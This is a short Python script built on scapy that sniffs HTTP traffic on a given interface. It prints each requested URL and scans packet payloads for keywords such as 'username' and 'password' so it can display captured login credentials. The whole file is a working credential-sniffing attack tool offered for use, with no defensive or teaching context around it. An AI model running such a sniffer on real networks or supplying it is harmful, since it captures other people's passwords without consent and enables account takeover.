#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
import argparse


def get_argument():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface to scan ")
    option = parser.parse_args()
    return option


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass", "submit"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        print("HTTP Request >>  : " + url)
        if login_info:
            print("LOGIN INFO\n----------------------\n " + login_info)
            print("\n\n")


interface_name = get_argument()
sniff(interface_name.interface)
